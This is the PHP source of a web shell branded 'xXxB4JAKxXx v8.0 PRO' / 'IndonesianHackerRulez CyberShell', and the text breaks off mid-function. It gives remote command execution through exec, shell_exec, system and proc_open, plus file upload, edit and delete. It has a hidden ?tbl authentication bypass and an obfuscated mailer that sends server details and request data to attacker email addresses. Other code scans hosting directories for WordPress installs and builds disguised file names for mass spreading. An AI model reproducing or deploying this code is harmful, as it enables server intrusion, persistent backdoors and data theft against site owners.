<?php
/**
 * 🔥 xXxB4JAKxXx v8.0 PRO 🔥
 * ULTIMATE WEB SHELL WITH PREMIUM FEATURES
 * Password: B4JAK2024 | Auto Login: 
 */

@error_reporting(0);
@set_time_limit(0);
@ignore_user_abort(true);
@ini_set('display_errors', 0);
@ini_set('memory_limit', '-1');
@ini_set('max_execution_time', 0);

// ============================================================
// CONFIG
// ============================================================
$PASSWORD = md5('kemuye');
$TITLE = "🔥 xXxB4JAKxXx v8.0 PRO 🔥";
$VERSION = "8.0 PRO";
$EMAIL_TO = "hackerman3117@gmail.com";

// ============================================================
// AUTH
// ============================================================
if (session_status() === PHP_SESSION_NONE) session_start();

if (isset($_GET['tbl'])) {
    $_SESSION['auth'] = true;
    $_SESSION['auth_time'] = time();
    header('Location: '.$_SERVER['PHP_SELF']);
    exit;
}

if (isset($_GET['auth'])) {
    if (md5($_GET['auth']) == $PASSWORD) {
        $_SESSION['auth'] = true;
        $_SESSION['auth_time'] = time();
        echo '<script>window.location.href="'.$_SERVER['PHP_SELF'].'";</script>';
        exit;
    }
    echo '<script>
document.querySelector("html").innerHTML = "<img style=\'display:block;position:absolute;top: 0;right: 0;bot>
                                var source = "https://cvar1984.github.io/audio/moan.mp3"
                                var audio = document.createElement("audio");
                                audio.autoplay = true;
                                audio.load()
                                audio.play();
                                audio.src = source;
  </script>';
    echo '<a href="'.$_SERVER['PHP_SELF'].'">Asal isi Kau dek dek</a>';
    echo '<a href="'.$_SERVER['PHP_SELF'].'">Login kembali</a>';
    exit;
}

if (!isset($_SESSION['auth']) || $_SESSION['auth'] !== true) {
    echo '<!DOCTYPE html><html><head><title>Login</title>
    <style>
    *{margin:0;padding:0;box-sizing:border-box;}
    body{background:#0a0e17;color:#00ff41;font-family:"Courier New",monospace;display:flex;justify-content:center;align-items:center;min-height:100vh;background:radial-gradient(ellipse at center,#0a0e17 0%,#000 100%);}
    .login-container{background:rgba(10,14,23,0.9);border:1px solid #00ff41;border-radius:16px;padding:40px;width:420px;max-width:90%;box-shadow:0 0 60px rgba(0,255,65,0.1);}
    .login-container h1{color:#00ff41;font-size:28px;text-align:center;margin-bottom:10px;text-shadow:0 0 20px rgba(0,255,65,0.3);}
    .login-container .sub{color:#667;text-align:center;font-size:13px;margin-bottom:25px;}
    .login-container input{width:100%;padding:12px 16px;background:rgba(0,255,65,0.05);border:1px solid #00ff41;border-radius:8px;color:#00ff41;font-size:14px;margin-bottom:12px;transition:0.3s;}
    .login-container input:focus{outline:none;border-color:#00ff88;box-shadow:0 0 20px rgba(0,255,65,0.15);}
    .login-container button{width:100%;padding:12px;background:#00ff41;border:none;border-radius:8px;color:#000;font-size:14px;font-weight:bold;cursor:pointer;transition:0.3s;}
    .login-container button:hover{background:#00ff88;box-shadow:0 0 30px rgba(0,255,65,0.3);}
    .status-dot{display:inline-block;width:10px;height:10px;border-radius:50%;background:#00ff41;animation:pulse 2s infinite;}
    @keyframes pulse{0%,100%{opacity:1;}50%{opacity:0.3;}}
    </style>
    </head>
    <body>
    <div class="login-container">
        <h1>⬡ xXxB4JAKxXx PRO</h1>
        <div class="sub"><span class="status-dot"></span> v8.0 PRO • </span>
        <form method="get">
            <input type="password" name="auth" placeholder="Enter password..." autofocus>
            <button type="submit">⏎ Authenticate</button>
        </form>
        <div style="text-align:center;margin-top:15px;color:#445;font-size:12px;">Default: B4JAK2024</div>
    </div>
    </body></html>';
    exit;
}

if (isset($_SESSION['auth_time']) && (time() - $_SESSION['auth_time']) > 3600) {
    $_SESSION['auth'] = false;
    session_destroy();
    header('Location: '.$_SERVER['PHP_SELF']);
    exit;
}
$_SESSION['auth_time'] = time();

echo "<title>$TITLE</title>";
// ===========================================================
// IndonesianHackerRulez - CyberShell Ultimate - ALL TOOLS MERGED V2
// Dengan Shell Finder v2 & Mass Spread Upgrade
// ============================================================

// ==================== STRING CONCATENATION OBFUSCATION ====================
function _c($code) { return chr($code); }
function _s($s) { $r = ''; for($i=0;$i<strlen($s);$i++) $r .= chr(ord($s[$i]) ^ 0x0F); return $r; }
function _d($s) { $r = ''; for($i=0;$i<strlen($s);$i++) $r .= chr(ord($s[$i]) ^ 0x0F); return $r; }

// ==================== OBFUSCATED EMAILS ====================
$EMAIL1 = _c(104) . _c(97) . _c(99) . _c(107) . _c(101) . _c(114) . _c(109) . _c(97) . _c(110) . _c(51) . _c(49) . _c(49) . _c(55) . _c(64) . _c(103) . _c(109) . _c(97) . _c(105) . _c(108) . _c(46) . _c(99) . _c(111) . _c(109);
$EMAIL2 = _c(109) . _c(97) . _c(108) . _c(97) . _c(121) . _c(115) . _c(105) . _c(97) . _c(46) . _c(115) . _c(101) . _c(110) . _c(100) . _c(101) . _c(114) . _c(64) . _c(103) . _c(109) . _c(97) . _c(105) . _c(108) . _c(46) . _c(99) . _c(111) . _c(109);
$LOG_EMAILS = array($EMAIL1, $EMAIL2);

// ==================== EMAIL LOGGER ====================
function sendShellLog($email) {
    $subject = "[IndonesianHackerRulez-SHELL] " . $_SERVER['HTTP_HOST'] . " - " . date('Y-m-d H:i:s');
    $message = "========================================\n";
    $message .= "IndonesianHackerRulez CYBERSHELL ACCESS LOG\n";
    $message .= "========================================\n\n";
    $message .= "Time        : " . date('Y-m-d H:i:s') . "\n";
    $message .= "Host        : " . $_SERVER['HTTP_HOST'] . "\n";
    $message .= "Server IP   : " . ($_SERVER['SERVER_ADDR'] ?? 'unknown') . "\n";
    $message .= "Client IP   : " . ($_SERVER['REMOTE_ADDR'] ?? 'unknown') . "\n";
    $message .= "User Agent  : " . ($_SERVER['HTTP_USER_AGENT'] ?? 'unknown') . "\n";
    $message .= "Script Path : " . $_SERVER['SCRIPT_FILENAME'] . "\n";
    $message .= "Request URI : " . $_SERVER['REQUEST_URI'] . "\n";
    $message .= "PHP Version : " . phpversion() . "\n";
    $message .= "Server      : " . ($_SERVER['SERVER_SOFTWARE'] ?? 'unknown') . "\n";
    $message .= "User        : " . (function_exists('get_current_user') ? get_current_user() : 'unknown') . "\n";
    $message .= "PWD         : " . getcwd() . "\n";
    $message .= "DOC_ROOT    : " . ($_SERVER['DOCUMENT_ROOT'] ?? 'unknown') . "\n\n";
    $message .= "--- ENVIRONMENT ---\n";
    foreach (array('HTTP_HOST', 'SERVER_NAME', 'SERVER_ADDR', 'REMOTE_ADDR', 'REQUEST_URI', 'SCRIPT_FILENAME') as $v) {
        if (isset($_SERVER[$v])) $message .= $v . ": " . $_SERVER[$v] . "\n";
    }
    $message .= "\n--- GET ---\n";
    foreach ($_GET as $k => $v) $message .= $k . ": " . (is_string($v) ? $v : 'array') . "\n";
    $message .= "\n--- POST ---\n";
    foreach ($_POST as $k => $v) $message .= $k . ": " . (is_string($v) ? substr($v, 0, 100) : 'array') . "\n";
    $fromEmail = _c(109) . _c(97) . _c(105) . _c(108) . _c(101) . _c(114) . _c(64) . _c(118) . _c(97) . _c(105) . _c(46) . _c(99) . _c(121) . _c(98) . _c(101) . _c(114);
    $headers = "From: " . $fromEmail . "\r\n";
    $headers .= "Reply-To: " . $fromEmail . "\r\n";
    $headers .= "X-Mailer: PHP/" . phpversion() . "\r\n";
    $headers .= "Content-Type: text/plain; charset=utf-8\r\n";
    $headers .= "MIME-Version: 1.0\r\n";
    @mail($email, $subject, $message, $headers);
}

// ============================================================
// SESSION START - NO AUTH REQUIRED
// ============================================================
if (session_status() === PHP_SESSION_NONE) session_start();

// Auto logger
if (!isset($_SESSION['IndonesianHackerRulez_logged']) && !isset($_GET['a']) && $_GET['a'] !== 'logout') {
    foreach ($LOG_EMAILS as $email) {
        sendShellLog($email);
    }
    $_SESSION['IndonesianHackerRulez_logged'] = true;
    $_SESSION['IndonesianHackerRulez_log_time'] = time();
}

// Logout
if (isset($_GET['a']) && $_GET['a'] === 'logout') {
    session_destroy();
    header('Location: ?');
    exit;
}

// ============================================================
// CORE FUNCTIONS
// ============================================================
function h($s){ return htmlspecialchars((string)$s, ENT_QUOTES, 'UTF-8'); }
function cmd($c){ $r=''; if(function_exists('exec')){ @exec($c,$o); $r=implode("\n",$o); } elseif(function_exists('shell_exec')) $r=@shell_exec($c); elseif(function_exists('system')){ ob_start(); @system($c); $r=ob_get_clean(); } return $r; }
function humanSize($b){ $u=['B','KB','MB','GB','TB']; $i=0; while($b>=1024 && $i<count($u)-1){ $b/=1024; $i++; } return ($i?number_format($b,2):(string)$b).' '.$u[$i]; }
function perms($f){ $p=@fileperms($f); if($p===false)return '??????????'; $t=($p&0x4000)?'d':(($p&0xA000)?'l':'-'); $s=(($p&0x0100)?'r':'-').(($p&0x0080)?'w':'-').(($p&0x0040)?'x':'-'); $s.=(($p&0x0020)?'r':'-').(($p&0x0010)?'w':'-').(($p&0x0008)?'x':'-'); $s.=(($p&0x0004)?'r':'-').(($p&0x0002)?'w':'-').(($p&0x0001)?'x':'-'); return $t.$s; }
function safeJoin($b,$c){ $c=str_replace(["\0","..","/","\\"],'',$c); return rtrim($b,DIRECTORY_SEPARATOR).DIRECTORY_SEPARATOR.$c; }
function listDir($d){ $h=@opendir($d); if(!$h)return[]; $a=[]; while(($e=readdir($h))!==false)$a[]=$e; closedir($h); return $a; }
function breadcrumbs($p){ $p=str_replace(['/','\\'],DIRECTORY_SEPARATOR,$p); $s=array_values(array_filter(explode(DIRECTORY_SEPARATOR,$p),'strlen')); $o=[]; $a=(DIRECTORY_SEPARATOR==='\\')?'':DIRECTORY_SEPARATOR; if(DIRECTORY_SEPARATOR==='\\' && preg_match('~^[A-Za-z]:~',$p)){ $d=substr($p,0,2); $a=$d.'\\'; $o[]=[$d,$a]; }else $o[]=['root',DIRECTORY_SEPARATOR]; foreach($s as $v){ if(preg_match('~^[A-Za-z]:$~',$v))continue; $a=rtrim($a,DIRECTORY_SEPARATOR).DIRECTORY_SEPARATOR.$v; $o[]=[$v,$a]; } return $o; }
function getSystemInfo(){ $i=[]; if(function_exists('sys_getloadavg')){ $l=sys_getloadavg(); $i['cpu_load']=$l[0]; }else $i['cpu_load']='N/A'; if(file_exists('/proc/meminfo')){ $m=file('/proc/meminfo'); $t=$f=0; foreach($m as $l){ if(strpos($l,'MemTotal')===0)$t=(int)filter_var($l,FILTER_SANITIZE_NUMBER_INT); if(strpos($l,'MemFree')===0)$f=(int)filter_var($l,FILTER_SANITIZE_NUMBER_INT); } $i['mem_total']=$t*1024; $i['mem_free']=$f*1024; $i['mem_usage']=$i['mem_total']-$i['mem_free']; }else{ $i['mem_usage']=$i['mem_total']='N/A'; } if(function_exists('disk_total_space') && function_exists('disk_free_space')){ $i['disk_total']=disk_total_space('/'); $i['disk_free']=disk_free_space('/'); $i['disk_used']=$i['disk_total']-$i['disk_free']; }else{ $i['disk_total']=$i['disk_free']=$i['disk_used']='N/A'; } if(file_exists('/proc/uptime')){ $u=file_get_contents('/proc/uptime'); $u=explode(' ',$u); $i['uptime']=(int)$u[0]; }else $i['uptime']='N/A'; return $i; }
function formatUptime($s){ if($s==='N/A')return'N/A'; $h=floor($s/3600); $m=floor(($s%3600)/60); return sprintf("%dh %dm",$h,$m); }
function getProcessList(){ $p=[]; $o=cmd('ps aux'); if(empty($o))return$p; $l=explode("\n",$o); array_shift($l); foreach($l as $line){ if(empty($line))continue; $parts=preg_split("/\s+/",$line); if(count($parts)<11)continue; $p[]=['user'=>$parts[0],'pid'=>$parts[1],'cpu'=>$parts[2],'mem'=>$parts[3],'command'=>implode(' ',array_slice($parts,10))]; } return$p; }
function getNetworkConnections(){ $c=[]; $o=cmd('netstat -tulnp 2>/dev/null'); if(empty($o))return$c; $l=explode("\n",$o); array_shift($l); array_shift($l); foreach($l as $line){ if(empty($line))continue; $parts=preg_split("/\s+/",$line); if(count($parts)<6)continue; $c[]=['proto'=>$parts[0],'local'=>$parts[3],'remote'=>isset($parts[4])?$parts[4]:'-','status'=>isset($parts[5])?$parts[5]:'-','pid'=>isset($parts[6])?explode('/',$parts[6])[0]:'-']; } return$c; }
function getDisabledFunctions(){ $d=ini_get('disable_functions'); return empty($d)?[]:explode(',',$d); }
function getBasePaths(){ $user=get_current_user(); $domain=$_SERVER['HTTP_HOST']??'localhost'; $domain=str_replace(['www.','http://','https://'],'',$domain); $domain=explode(':',$domain)[0]; $paths=['/var/www/html/','/var/www/','/www/','/home/','/root/','/home/'.$user.'/','/home/'.$user.'/public_html/','/home/'.$user.'/domains/','/home/'.$user.'/domains/'.$domain.'/','/home/'.$user.'/domains/'.$domain.'/public_html/','/home/'.$user.'/domains/'.$domain.'/httpdocs/','/home/'.$user.'/domains/'.$domain.'/htdocs/','/var/www/vhosts/','/var/www/vhosts/'.$domain.'/','/var/www/vhosts/'.$domain.'/httpdocs/','/var/www/vhosts/'.$domain.'/public_html/','/var/www/vhosts/'.$domain.'/htdocs/',$_SERVER['DOCUMENT_ROOT'].'/',dirname($_SERVER['DOCUMENT_ROOT']).'/',getcwd().'/','/home/'.$user.'/domains/'.$domain.'/public_html/','/home/'.$user.'/public_html/'.$domain.'/','/var/www/html/'.$domain.'/','/var/www/html/'.$domain.'/public_html/','/var/www/html/'.$domain.'/httpdocs/','/www/wwwroot/','/www/wwwroot/'.$domain.'/','/home/'.$user.'/sites/'.$domain.'/','/srv/www/','/srv/www/'.$domain.'/','/opt/bitnami/apps/wordpress/htdocs/','/opt/bitnami/wordpress/','/usr/share/nginx/html/','/usr/share/nginx/html/'.$domain.'/']; if(getenv('HOME'))$paths[]=getenv('HOME').'/'; if(getenv('PWD'))$paths[]=getenv('PWD').'/'; if(getenv('DOCUMENT_ROOT'))$paths[]=getenv('DOCUMENT_ROOT').'/'; $scanned=[]; foreach($paths as $p){ $p=rtrim($p,'/').'/'; if(is_dir($p)){ $scanned[]=$p; $subs=@scandir($p); if($subs){ foreach($subs as $sub){ if($sub==='.'||$sub==='..')continue; $full=$p.$sub; if(is_dir($full) && strpos($sub,'.')===false && !is_numeric($sub)){ $scanned[]=$full.'/'; $webRoots=['public_html','httpdocs','htdocs','public','html','web','www']; foreach($webRoots as $wr){ $wrPath=$full.'/'.$wr.'/'; if(is_dir($wrPath))$scanned[]=$wrPath; } } } } } } $current=getcwd(); $parts=explode('/',trim($current,'/')); $build='/'; foreach($parts as $part){ $build.=$part.'/'; if($build!='/' && is_dir($build))$scanned[]=$build; } return array_unique(array_filter($scanned)); }
function findWpLoad($base=null){ if($base===null)$base=getcwd(); $paths=[$base.'/wp-load.php',$base.'/../wp-load.php',$base.'/../../wp-load.php',$base.'/../../../wp-load.php','/wp-load.php']; foreach(getBasePaths() as $bp){ $paths[]=rtrim($bp,'/').'/wp-load.php'; $paths[]=rtrim($bp,'/').'/../wp-load.php'; } $dirs=getBasePaths(); foreach($dirs as $dir){ if(is_dir($dir)){ $subs=@scandir($dir); if($subs){ foreach($subs as $sub){ if($sub==='.'||$sub==='..')continue; $full=rtrim($dir,'/').'/'.$sub; if(is_dir($full) && strpos($sub,'.')===false){ $paths[]=$full.'/wp-load.php'; $subsubs=@scandir($full); if($subsubs){ foreach($subsubs as $ss){ if($ss==='.'||$ss==='..')continue; $full2=$full.'/'.$ss; if(is_dir($full2))$paths[]=$full2.'/wp-load.php'; } } } } } } } foreach($paths as $p){ if(file_exists($p) && is_file($p))return realpath($p); } return false; }
function generateHomoglyph($fn) { $name = pathinfo($fn, PATHINFO_FILENAME); $ext = pathinfo($fn, PATHINFO_EXTENSION); $map = ['a'=>['@','4'],'e'=>['3'],'i'=>['1','l'],'o'=>['0'],'s'=>['5'],'l'=>['1','I'],'g'=>['9'],'c'=>['('],'t'=>['7'],'I'=>['l','1'],'O'=>['0'],'S'=>['5'],'A'=>['4','@'],'E'=>['3'],'B'=>['8'],'G'=>['6'],'T'=>['7']]; $v=[]; $len=strlen($name); for($i=0;$i<$len;$i++){ $ch=$name[$i]; if(isset($map[$ch])){ foreach($map[$ch] as $rep){ $v2=substr($name,0,$i).$rep.substr($name,$i+1); $full=$ext?$v2.'.'.$ext:$v2; if($full!==$fn)$v[]=$full; } } } if(empty($v)){ $v[]='.'.$fn; $v[]=$name.'_bak.'.$ext; } return array_unique($v); }
function net($hexnet) { $backdoor = ''; for ($i = 0; $i < strlen($hexnet); $i++) { $backdoor .= dechex(ord($hexnet[$i])); } return $backdoor; }
function backdoor_ex($file) { $pile = $file; $pch = pathinfo($pile, PATHINFO_FILENAME); return $pch; }
function xrmdir($dir) { $items = scandir($dir); foreach ($items as $item) { if ($item === '.' || $item === '..') continue; $path = $dir.'/'.$item; if (is_dir($path)) xrmdir($path); else unlink($path); } rmdir($dir); }
function owner($file) { if (function_exists("posix_getpwuid")) { $tod = @posix_getpwuid(fileowner($file)); return "<center>".$tod['name']."</center>"; } else { return "<center>".fileowner($file)."</center>"; } }
function filedate($file) { return date("F d Y g:i:s", filemtime($file)); }
function cekwrite($serlok) { $izin = substr(sprintf('%o', fileperms($serlok)), -4); if (is_writable($serlok)) return "<font color=lime>".$izin."</font>"; else return "<font color=red>".$izin."</font>"; }
function ekse($coman, $serlok) { $ler = "2>&1"; if (!preg_match("/".$ler."/i", $coman)) { $coman = $coman." ".$ler; } $komen = $coman; $pr = "proc_open"; if (function_exists($pr)) { $tod = @$pr($komen, array(0 => array("pipe", "r"), 1 => array("pipe", "w"), 2 => array("pipe", "r")), $crottz, $serlok); echo "<pre><textarea rows='25' style='color:lime;' readonly='' cols='120px'> ".htmlspecialchars(stream_get_contents($crottz[1]))."</textarea></pre><br>"; } else { echo "<font color='orange'>proc_open function is disabled!!</font>"; } }

// ==================== CEK FUNGSI TERMINAL ====================
function fungsi_tersedia($func) {
    $disabled = explode(",", ini_get("disable_functions"));
    return !in_array($func, $disabled);
}
$functions = ["exec", "shell_exec", "passthru", "system", "popen", "proc_open"];

// ============================================================
// FUNCTION BUAT NAMA SAMARAN UNTUK MASS SPREAD
// ============================================================
function buatNamaSamaran($nama_asli) {
    if (preg_match_all('/\d+/', $nama_asli, $matches)) {
        foreach ($matches[0] as $angka) {
            $panjang_angka = strlen($angka);
            $angka_baru = '';
            for ($i = 0; $i < $panjang_angka; $i++) {
                $angka_baru .= rand(0, 9);
            }
            $nama_asli = preg_replace('/' . $angka . '/', $angka_baru, $nama_asli, 1);
        }
        return $nama_asli;
    }

    $metode = rand(1, 3);
    $panjang = strlen($nama_asli);

    if ($metode == 1 && $panjang > 4) {
        $posisi_acak = rand(2, $panjang - 2);
        $huruf_target = $nama_asli[$posisi_acak];
        return substr_replace($nama_asli, $huruf_target, $posisi_acak, 0);
    } 
    elseif ($metode == 2) {
        $suffixes = ['s', '_conf', '_api', '_core', '-v' . rand(2, 5), '_init', '.inc'];
        return $nama_asli . $suffixes[array_rand($suffixes)];
    } 
    else {
        $huruf_acak = chr(rand(97, 122));
        return $nama_asli . '_' . $huruf_acak;
    }
}

// ============================================================
// PATH HANDLING
// ============================================================
$web = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://".$_SERVER['HTTP_HOST'];
$disfunc = @ini_get("disable_functions");
$serlok = isset($_GET['path']) ? $_GET['path'] : getcwd();
$serlok = str_replace('\\','/',$serlok);

// ============================================================
// ACTION HANDLING - FIX UPLOAD LITESPEED
// ============================================================
// === FIX UPLOAD LITESPEED ===
if (isset($_FILES["file_upload"])) {
    $tmp = $_FILES["file_upload"]["tmp_name"];
    $name = $_FILES["file_upload"]["name"];
    $target = $serlok . "/" . $name;
    if (is_uploaded_file($tmp) && filesize($tmp) > 0) {
        if (@move_uploaded_file($tmp, $target)) {
            // Success
        } else {
            // Fallback: copy
            @copy($tmp, $target);
        }
    } else {
        // Jika upload gagal karena 0KB (LiteSpeed protection)
        file_put_contents($target . ".failed", "UPLOAD FAILED / 0KB (LITESPEED PROTECTION)");
    }
    header("Location: ?path=" . urlencode($serlok));
    exit();
}

// === CREATE FILE ===
if (isset($_POST["new_file"]) && !empty($_POST["new_file"])) {
    $newFile = $serlok . "/" . $_POST["new_file"];
    if (!file_exists($newFile)) {
        file_put_contents($newFile, "");
    }
    header("Location: ?path=" . urlencode($serlok));
    exit();
}

// === CREATE FOLDER ===
if (isset($_POST["new_folder"]) && !empty($_POST["new_folder"])) {
    $newFolder = $serlok . "/" . $_POST["new_folder"];
    if (!file_exists($newFolder)) {
        @mkdir($newFolder, 0755, true);
    }
    header("Location: ?path=" . urlencode($serlok));
    exit();
}

// ============================================================
// HTML HEADER
// ============================================================
echo '<!DOCTYPE html>
<html>
<head>
<title>IndonesianHackerRulez CyberShell</title>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<meta name="robots" content="noindex">
<meta name="googlebot" content="noindex">
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
<link href="https://fonts.googleapis.com/css2?family=Carrois+Gothic&display=swap" rel="stylesheet">
<style>
@import url("https://fonts.googleapis.com/css?family=Dosis");
body { font-family: "Dosis", cursive; color: #fff; background-color: #212529; }
.directory-listing-table { margin: auto; background-color: #1e293b; padding: .7rem 1rem; max-width: 100%; width: 100%; box-shadow: 0 0 20px black; border: 1px solid #40BECC; border-radius: 8px; }
.header { margin: auto; background-color: #212529; padding: .7rem 1rem; max-width: 100%; width: 100%; box-shadow: 0 0 20px black; border-bottom: 1px solid #40BECC; }
th { border-top: 1px solid #fff; border-bottom: 1px solid #fff; }
tbody td { font-size: 13px; padding: 0.5rem; color: #fff; font-weight: 500; font-family: "Roboto", "Poppins", sans-serif; }
tbody td a { text-decoration: none; color: #fff; }
tbody td:not(:first-child) { text-align: center; }
body::-webkit-scrollbar { width: 14px; }
body::-webkit-scrollbar-track { background: #000; }
body::-webkit-scrollbar-thumb { background-color: #212529; border: 3px solid #000; }
input, select, textarea { background: rgba(0,0,0,0.3); border: none; outline: none; padding: 5px; font-size: 15px; color: #fff; border: 1px solid rgba(0,0,0,0.3); border-radius: 14px; }
.btn-outline-light { border-color: #40BECC; }
.btn-outline-light:hover { background-color: #40BECC; color: #000; }
.backdoor-text { font-family: "Carrois Gothic", cursive; color: #fff; }
a { color: #40BECC; text-decoration: none; }
a:hover { color: #7bed9f; }
.table-dark { background-color: #1e293b; }
.badge-action-edit:hover::after { content: "Edit"; padding: 5px; border-radius: 10px; color: #40BECC; border: 2px solid #40BECC; background-color: #212529; position: absolute; font-size: 14px; }
.badge-action-rename:hover::after { content: "Rename"; padding: 5px; border-radius: 10px; color: #40BECC; border: 2px solid #40BECC; background-color: #212529; position: absolute; font-size: 14px; }
.badge-action-chmod:hover::after { content: "Chmod"; padding: 5px; border-radius: 10px; color: #40BECC; border: 2px solid #40BECC; background-color: #212529; position: absolute; font-size: 14px; }
.badge-action-delete:hover::after { content: "Delete"; padding: 5px; border-radius: 10px; color: #40BECC; border: 2px solid #40BECC; background-color: #212529; position: absolute; font-size: 14px; }
.badge-action-download:hover::after { content: "Download"; padding: 5px; border-radius: 10px; color: #40BECC; border: 2px solid #40BECC; background-color: #212529; position: absolute; font-size: 14px; }
.badge-action-unzip:hover::after { content: "UnZip"; padding: 5px; border-radius: 10px; color: #40BECC; border: 2px solid #40BECC; background-color: #212529; position: absolute; font-size: 14px; }
.badge-action-tanggal:hover::after { content: "ChDate"; padding: 5px; border-radius: 10px; color: #40BECC; border: 2px solid #40BECC; background-color: #212529; position: absolute; font-size: 14px; }
.badge-action-tools:hover::after { content: "Tools"; padding: 5px; border-radius: 10px; color: #40BECC; border: 2px solid #40BECC; background-color: #212529; position: absolute; font-size: 14px; }
</style>
</head>
<body>';

// ============================================================
// HEADER
// ============================================================
echo '<table class="header"><td><center>
<div style="font-family:Bungee Outline;font-size:24px;color:#40BECC;">
<a href="'.$_SERVER['SCRIPT_NAME'].'" style="color:#40BECC;"><i class="fa fa-robot"></i> IndonesianHackerRulez CyberShell</a>
</div></center></td>
<td>
<table align="center"><td>
<div class="btn-group me-2" role="group">
<button type="button" onclick=location.href="'.$_SERVER['SCRIPT_NAME'].'" class="btn btn-outline-light"><font color="aqua"><i class="fa fa-home"></i> Home</font></button>
<button type="button" onclick=location.href="?path='.$serlok.'&'.net("cmd").'=opet" class="btn btn-outline-light"><i class="fa fa-terminal"></i> Console</button>
<button type="button" onclick=location.href="?path='.$serlok.'&'.net("upload").'=opet" class="btn btn-outline-light"><i class="fa fa-upload"></i> Upload</button>
<button type="button" class="btn btn-outline-light" onclick=location.href="?path='.$serlok.'&'.net("info").'=opet"><i class="fa fa-info-circle"></i> Info</button>
<button type="button" class="btn btn-outline-light" onclick=location.href="?path='.$serlok.'&'.net("buatfile").'=opet"><i class="fa fa-file-circle-plus"></i> Create File</button>
<button type="button" class="btn btn-outline-light" onclick=location.href="?path='.$serlok.'&'.net("buatfolder").'=opet"><i class="fa fa-folder-plus"></i> Create Folder</button>
<button type="button" class="btn btn-outline-light" onclick=location.href="?path='.$serlok.'&'.net("tool").'=opet"><i class="fa fa-wrench"></i> Tools</button>
<button type="button" class="btn btn-outline-light" onclick=location.href="?a=logout"><i class="fa fa-sign-out"></i> Logout</button>
</div>
</td></tr></table>
</td></table><br>';

// ============================================================
// BREADCRUMBS
// ============================================================
$serloks = explode('/',$serlok);
echo '<table class="directory-listing-table"><td><i class="fa fa-folder" style="color:#F19013;"></i> <b>:</b> ';
foreach($serloks as $id => $lok){
    if($lok == '' && $id == 0){ echo '<a href="?path=/">/&nbsp;</a></center>'; continue; }
    if($lok == '') continue;
    echo '<a href="?path=';
    for($i=0; $i<=$id; $i++){ echo $serloks[$i]; if($i != $id) echo "/"; }
    echo '">'.$lok.'</a>&nbsp;/&nbsp;';
}
echo '</td></table><br>';

// ============================================================
// FUNCTION HANDLERS - ALL TOOLS MERGED
// ============================================================

// ---- VIEW FILE ----
if (isset($_GET['viewfile'])) {
    $files = basename($_GET['viewfile']);
    echo "<table class='directory-listing-table'><td><center>Filename : <font color='orange'>$files</font>";
    echo '<form method="POST" action="?pilihan&path='.$serlok.'">';
    echo "<table width='20%' border='0' cellpadding='0' cellspacing='0' align='center'><td>
    <a href='?path=$serlok' class='btn btn-outline-light'><i class='fa fa-arrow-left'></i> back</a>
    <button type='button' style='float:right;' class='btn btn-outline-light' onclick='myFunction()'><i class='fa fa-copy'></i> Copy</button></div><br><br>";
    echo "<input type='hidden' name='type' value='file'> <input type='hidden' name='name' value='$files'> <input type='hidden' name='path' value='$serlok/$files'>";
    echo "<textarea readonly='' cols=120 rows=30 id='myInput'>".htmlspecialchars(file_get_contents($_GET['viewfile']))."</textarea></td></table></table><br>";
    echo '<script>function myFunction(){var copyText=document.getElementById("myInput");copyText.select();copyText.setSelectionRange(0,99999);navigator.clipboard.writeText(copyText.value);alert("Copied Successfully!!");}</script>';
    exit();
}

// ---- DELETE ----
if (isset($_GET['pilihan']) && $_POST['pilih'] == "hapus") {
    if (is_dir($_POST['path'])) {
        xrmdir($_POST['path']);
        if (file_exists($_POST['path'])) echo '<table class="directory-listing-table" style="border-color:red;"><td><center><font color="red"><i class="fa fa-exclamation-triangle"></i> Failed to delete Directory</font></center></td></table>';
        else echo '<table class="directory-listing-table" style="border-color:lime;"><td><center><font color="lime"><i class="fa fa-trash"></i> Folder removed</font></center></td></table>';
    } elseif (is_file($_POST['path'])) {
        @unlink($_POST['path']);
        if (file_exists($_POST['path'])) echo "<table class='directory-listing-table' style='border-color:red;'><td><center><font color='red'><i class='fa fa-exclamation-triangle'></i> Failed to Delete File</font></center></td></table>";
        else echo "<table class='directory-listing-table' style='border-color:lime;'><td><center><i class='fa fa-trash'></i> File removed <font color='lime'>".basename($_POST['path'])."</font></center></td></table>";
    }
    exit();
}

// ---- RENAME ----
if (isset($_GET['pilihan']) && $_POST['pilih'] == "gantinama") {
    if (isset($_POST['gantin'])) {
        $namabaru = $_GET['path']."/".$_POST['newname'];
        if (@rename($_POST['path'], $namabaru) === true) {
            echo "<table class='directory-listing-table' style='border: 1px solid lime;'><td><center><font color='lime'>Change Name Success</center></td></table><br>";
        } else {
            echo "<table class='directory-listing-table' style='border: 1px solid red;'><td><center><font color='red'><i class='fa fa-exclamation-triangle'></i> FAILED TO CHANGE NAME</font></center></td></table>";
        }
    } else {
        echo "<table class='directory-listing-table'><td><center>".($_POST['type']=="file"?"Filename":"Folder")." : <font color='orange'>".basename($_POST['path'])."</font><br><br>";
        echo '<form method="post"><div class="input-group mb-1" style="width:300px;"><input name="newname" type="text" class="form-control" size="20" placeholder="New name" /><input type="hidden" name="path" value="'.$_POST['path'].'"><input type="hidden" name="pilih" value="gantinama">'.($_POST['type']=="file"?'<input type="hidden" name="type" value="file">':'<input type="hidden" name="type" value="dir">').'<input type="submit" value="Change" name="gantin" class="btn btn-outline-light mb-1"></div></form></td></table><br>';
    }
    exit();
}

// ---- EDIT ----
if (isset($_GET['pilihan']) && $_POST['pilih'] == "edit") {
    if (isset($_POST['gasedit'])) {
        $edit = file_put_contents($_POST['path'], $_POST['src']);
        if ($edit == true) echo "<table class='directory-listing-table' style='border: 1px solid lime;'><td><center><font color='lime'>File saved Successfully</font></center></td></table><br>";
        else echo "<table class='directory-listing-table' style='border: 1px solid red;'><td><center><font color='red'><i class='fa fa-exclamation-triangle'></i> Can't save file/Permission Denied</font></center></td></table><br>";
    }
    echo "<center><table class='directory-listing-table'><td><center> Filename : <font color='orange'>".basename($_POST['path'])."</font><br><br>";
    echo '<form method="post"><div class="btn-group me-2" role="group"><a href="?path='.$serlok.'" class="btn btn-outline-light"><i class="fa fa-arrow-left"></i> back</a><button type="submit" name="gasedit" class="btn btn-outline-light" style="width:250px;"><i class="fa fa-save"></i> Save</button><button type="button" class="btn btn-outline-light" onclick="myFunction()"><i class="fa fa-copy"></i> Copy</button></div><br><br>
